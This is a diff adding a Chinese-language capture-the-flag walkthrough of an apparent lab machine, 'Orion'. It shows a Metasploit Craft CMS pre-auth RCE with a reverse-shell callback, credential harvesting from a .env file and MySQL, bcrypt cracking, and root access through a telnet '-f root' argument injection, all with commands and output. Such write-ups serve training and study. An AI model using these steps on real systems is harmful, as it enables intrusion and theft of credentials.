@@ -1286,3 +1286,220 @@ root@wingdata:/tmp# cat /home/wacky/user.txt
 Wacky answer：3013e21272bf1c881e02e47605513047
 
 Root answer：72cf7e351c06e6db4b4979cf91ff79fb
+
+# 靶场：Orion(Linux)
+
+## Nmap扫描&主机解析
+
+```
+┌──(kali㉿kali)-[~/Desktop]
+└─$ nmap -sC -sV 10.129.16.247
+Starting Nmap 7.98 ( https://nmap.org ) at 2026-07-04 07:26 -0400
+Nmap scan report for 10.129.16.247
+Host is up (0.22s latency).
+Not shown: 998 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.15 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
+|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
+80/tcp open  http    nginx 1.18.0 (Ubuntu)
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+|_http-title: Did not follow redirect to http://orion.htb/
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 16.30 seconds
+                                                                         
+┌──(kali㉿kali)-[~/Desktop]
+└─$ echo '10.129.16.247 orion.htb' | sudo tee -a /etc/hosts
+```
+
+## 目录枚举
+
+```
+┌──(venv)─(kali㉿kali)-[~/Desktop/DirAI-BzA]
+└─$ gobuster dir -u http://orion.htb/ -w /usr/share/wordlists/dirb/common.txt
+admin                (Status: 302) [Size: 0] [--> http://orion.htb/admin/login]  
+```
+
+## Metasploit利用
+
+进入登陆页面，发现为Craft CMS 5.6.16，发现存在远程代码执行漏洞
+
+```
+──(venv)─(kali㉿kali)-[~/Desktop/DirAI-BzA]
+└─$ msfconsole
+
+msf > search craftcms
+
+Matching Modules
+================
+
+   #  Name                                                    Disclosure Date  Rank       Check  Description
+   -  ----                                                    ---------------  ----       -----  -----------
+   0  exploit/linux/http/craftcms_preauth_rce_cve_2025_32432  2025-04-14       excellent  Yes    Craft CMS Image Transform Preauth RCE (CVE-2025-32432)
+   1    \_ target: PHP In-Memory                              .                .          .      .
+   2    \_ target: Unix/Linux Command Shell                   .                .          .      .
+   3  exploit/linux/http/craftcms_ftp_template                2024-12-19       excellent  Yes    Craft CMS Twig Template Injection RCE via FTP Templates Path
+   4  exploit/linux/http/craftcms_unauth_rce_cve_2023_41892   2023-09-13       excellent  Yes    Craft CMS unauthenticated Remote Code Execution (RCE)
+   5    \_ target: PHP                                        .                .          .      .
+   6    \_ target: Unix Command                               .                .          .      .
+   7    \_ target: Linux Dropper                              .                .          .      .
+
+
+Interact with a module by name or index. For example info 7, use 7 or use exploit/linux/http/craftcms_unauth_rce_cve_2023_41892                   
+After interacting with a module you can manually set a TARGET with set TARGET 'Linux Dropper'
+
+msf > use exploit/linux/http/craftcms_preauth_rce_cve_2025_32432 
+[*] No payload configured, defaulting to php/meterpreter/reverse_tcp
+msf exploit(linux/http/craftcms_preauth_rce_cve_2025_32432) > set RHOSTS 10.129.16.247
+RHOSTS => 10.129.16.247
+msf exploit(linux/http/craftcms_preauth_rce_cve_2025_32432) > set VHOST orion.htb
+VHOST => orion.htb
+msf exploit(linux/http/craftcms_preauth_rce_cve_2025_32432) > set LHOST 10.10.16.230
+LHOST => 10.10.16.230
+msf exploit(linux/http/craftcms_preauth_rce_cve_2025_32432) > set LPORT 4444
+LPORT => 4444
+msf exploit(linux/http/craftcms_preauth_rce_cve_2025_32432) > run
+```
+
+## 交互式 shell 升级
+
+```
+meterpreter > shell
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+```
+
+## 敏感文件发现
+
+```
+www-data@orion:~/html/craft/web$ cat /home/adam/adam.txt
+cat /home/adam/adam.txt
+cat: /home/adam/adam.txt: Permission denied
+
+www-data@orion:~/html/craft/web$ find / -name ".env" 2>/dev/null
+find / -name ".env" 2>/dev/null
+/var/www/html/craft/.env
+www-data@orion:~/html/craft/web$ cat /var/www/html/craft/.env
+cat /var/www/html/craft/.env
+# Read about configuration, here:
+# https://craftcms.com/docs/5.x/configure.html
+
+# The application ID used to to uniquely store session and cache data, mutex locks, and more
+CRAFT_APP_ID=CraftCMS--67912ad2-1f1b-4993-bfec-e64daa5c23ff
+
+# The environment Craft is currently running in (dev, staging, production, etc.)
+CRAFT_ENVIRONMENT=dev
+
+# General settings
+CRAFT_SECURITY_KEY=RRS86F6i2JQKdC6kfEI7frVxA47WVMx8
+CRAFT_DEV_MODE=true
+CRAFT_ALLOW_ADMIN_CHANGES=true
+CRAFT_DISALLOW_ROBOTS=true
+CRAFT_DB_DRIVER=mysql
+CRAFT_DB_SERVER=127.0.0.1
+CRAFT_DB_PORT=3306
+CRAFT_DB_DATABASE=orion
+CRAFT_DB_USER=root
+CRAFT_DB_PASSWORD=SuperSecureCraft123Pass!
+CRAFT_DB_SCHEMA=
+CRAFT_DB_TABLE_PREFIX=
+
+PRIMARY_SITE_URL=http://orion.htb/
+```
+
+## 提取用户凭证
+
+```
+www-data@orion:~/html/craft/web$ mysql -h 127.0.0.1 -u root -p
+mysql -h 127.0.0.1 -u root -p
+Enter password: SuperSecureCraft123Pass!
+// 之后就是数据库的操作
+show databses;
+use orion;
+show tables;
+desc users;
+select username,email,password from orion.users;
+// 最后拿到
+| admin    | adam@orion.htb | $2y$13$e9zuohgFZzGtbQalcn9Mz.5PJbjxobO0GMbXo8NHp3P/B42LUg0lS |
+```
+
+或者一步到位
+
+```
+www-data@orion:~/html/craft/web$ mysql -u root -p'SuperSecureCraft123Pass!' -e "SELECT username, email, password FROM orion.users;"
+<SELECT username, email, password FROM orion.users;"
++----------+----------------+--------------------------------------------------------------+
+| username | email          | password                                                     |
++----------+----------------+--------------------------------------------------------------+
+| admin    | adam@orion.htb | $2y$13$e9zuohgFZzGtbQalcn9Mz.5PJbjxobO0GMbXo8NHp3P/B42LUg0lS |
++----------+----------------+--------------------------------------------------------------+
+```
+
+## 破解hash
+
+bcrypt 算法
+
+```
+┌──(kali㉿kali)-[~/Desktop/DirAI-BzA]
+└─$ hashid '$2y$13$e9zuohgFZzGtbQalcn9Mz.5PJbjxobO0GMbXo8NHp3P/B42LUg0lS'
+Analyzing '$2y$13$e9zuohgFZzGtbQalcn9Mz.5PJbjxobO0GMbXo8NHp3P/B42LUg0lS'
+[+] Blowfish(OpenBSD) 
+[+] Woltlab Burning Board 4.x 
+[+] bcrypt 
+```
+
+```
+┌──(kali㉿kali)-[~/Desktop]
+└─$ john --format=bcrypt --wordlist=/usr/share/wordlists/rockyou.txt bcrypt_hash.txt
+Using default input encoding: UTF-8
+Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
+Cost 1 (iteration count) is 8192 for all loaded hashes
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+darkangel        (?)     
+1g 0:00:00:22 DONE (2026-07-04 09:00) 0.04361g/s 29.82p/s 29.82c/s 29.82C/s gloria..010203
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+```
+
+## SSH访问&拿到userflag
+
+```
+┌──(kali㉿kali)-[~/Desktop]
+└─$ ssh adam@orion.htb 
+The authenticity of host 'orion.htb (10.129.16.247)' can't be established.
+ED25519 key fingerprint is: SHA256:TgNhCKF6jUX7MG8TC01/MUj/+u0EBasUVsdSQMHdyfY
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added 'orion.htb' (ED25519) to the list of known hosts.
+adam@orion.htb's password: 
+adam@orion:~$ cat user.txt 
+0ed62a38c4a6e6b79dafc268f3b26eae
+```
+
+## CVE-2026-24061提权拿到rootflag
+
+```
+adam@orion:~$ netstat -tulnp | grep 23
+(Not all processes could be identified, non-owned process info
+ will not be shown, you would have to be root to see it all.)
+tcp        0      0 127.0.0.1:23            0.0.0.0:*               LISTEN      -                   
+adam@orion:~$ telnet --version
+telnet (GNU inetutils) 2.7
+Copyright (C) 2025 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <https://gnu.org/licenses/gpl.html>.
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.
+
+Written by many authors.
+```
+
+```
+adam@orion:~$ telnet 127.0.0.1 -l "-f root"
+root@orion:~# ls
+root.txt  snap
+root@orion:~# cat root.txt 
+ceba8f3e8c4bcf1c44472f6402298310
+```
